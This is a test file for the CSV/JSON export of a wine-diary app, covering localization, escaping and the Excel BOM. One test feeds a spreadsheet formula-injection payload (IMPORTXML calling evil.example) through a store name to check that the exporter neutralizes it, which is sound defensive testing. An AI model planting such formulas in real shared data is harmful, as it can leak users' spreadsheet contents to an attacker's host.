import { describe, expect, test } from 'bun:test'

import { buildCsvExport, buildJsonExport, type ExportEntry } from './export'

function entry(overrides: Partial<ExportEntry> = {}): ExportEntry {
  return {
    id: 'entry-1',
    tastedOn: '2026-07-22',
    volumeMl: 300,
    rating: 4.5,
    price: 60,
    currency: 'GEL',
    purchaseCountry: 'GE',
    storeName: 'Goodwill',
    storeCountryCode: 'GE',
    storeCity: 'Тбилиси',
    wineName: 'Saperavi',
    wineProducer: 'Château Mukhrani',
    wineType: 'RED',
    wineSugar: 'DRY',
    wineOriginCountry: 'GE',
    wineRegion: 'Kakheti',
    wineGrapes: ['Саперави'],
    wineVintage: 2021,
    wineAbv: 13.5,
    body: 'FULL',
    acidity: 'MEDIUM',
    tannins: 'VELVET',
    tasteCategory: 'VI',
    aftertaste: 'BALANCED',
    notes: 'Тёмная вишня',
    aromas: [{ nameRu: 'ягода', nameEn: 'berry' }],
    isSameBottleRepeat: false,
    photoCount: 0,
    createdAt: new Date('2026-07-22T20:00:00.000Z'),
    updatedAt: new Date('2026-07-22T20:00:00.000Z'),
    ...overrides,
  }
}

describe('diary export (ТЗ §14)', () => {
  test('CSV подписан на языке интерфейса и переводит значения словарей', () => {
    const rows = buildCsvExport({ entries: [entry()], locale: 'ru' }).split('\r\n')

    expect(rows[0]).toContain('Дата,Вино,Производитель,Тип')
    expect(rows[1]).toContain('красное')
    expect(rows[1]).toContain('Грузия')
    // Бокалы считаются из миллилитров, как во всех метриках (ТЗ §7.2).
    expect(rows[1]).toContain(',300,2,4.5,')

    const english = buildCsvExport({ entries: [entry()], locale: 'en' }).split('\r\n')
    expect(english[0]).toContain('Date,Wine,Producer,Type')
    expect(english[1]).toContain('red')
    expect(english[1]).toContain('Georgia')
  })

  test('CSV экранирует запятые, кавычки и переносы строк в заметках', () => {
    const csv = buildCsvExport({
      entries: [entry({ notes: 'Вишня, дым\nи «дуб» с "кавычками"' })],
      locale: 'ru',
    })

    expect(csv).toContain('"Вишня, дым\nи «дуб» с ""кавычками"""')
    // Экранированная заметка не должна разъезжать строку на несколько записей.
    expect(csv.split('\r\n')).toHaveLength(2)
  })

  test('CSV начинается с BOM, иначе Excel открывает кириллицу кракозябрами', () => {
    expect(buildCsvExport({ entries: [], locale: 'ru' }).startsWith('﻿')).toBe(true)
  })

  test('JSON остаётся машинным: английские ключи и коды перечислений', () => {
    const parsed = JSON.parse(
      buildJsonExport({
        entries: [entry({ isSameBottleRepeat: true })],
        exportedAt: new Date('2026-07-28T09:00:00.000Z'),
      }),
    )

    expect(parsed.exportedAt).toBe('2026-07-28T09:00:00.000Z')
    expect(parsed.entryCount).toBe(1)
    expect(parsed.entries[0].wine.type).toBe('RED')
    expect(parsed.entries[0].tasteCategory).toBe('VI')
    expect(parsed.entries[0].glasses).toBe(2)
    expect(parsed.entries[0].isSameBottleRepeat).toBe(true)
  })

  test('обезвреживает формулу, приехавшую из общего справочника магазинов', () => {
    // Название магазина вводит другой пользователь, а выгрузку открывают в Excel или
    // Google Sheets — без защиты один человек прислал бы формулу в файл другого.
    const csv = buildCsvExport({
      entries: [entry({ storeName: '=IMPORTXML("http://evil.example","//a")', notes: '+1+1' })],
      locale: 'ru',
    })

    expect(csv).toContain(`"'=IMPORTXML(""http://evil.example"",""//a"")"`)
    expect(csv).toContain("'+1+1")
    expect(csv).not.toContain(',=IMPORTXML')
  })

  test('пустой дневник выгружается без строк, но с заголовком и структурой', () => {
    expect(buildCsvExport({ entries: [], locale: 'ru' }).split('\r\n')).toHaveLength(1)
    expect(
      JSON.parse(buildJsonExport({ entries: [], exportedAt: new Date() })).entries,
    ).toEqual([])
  })
})
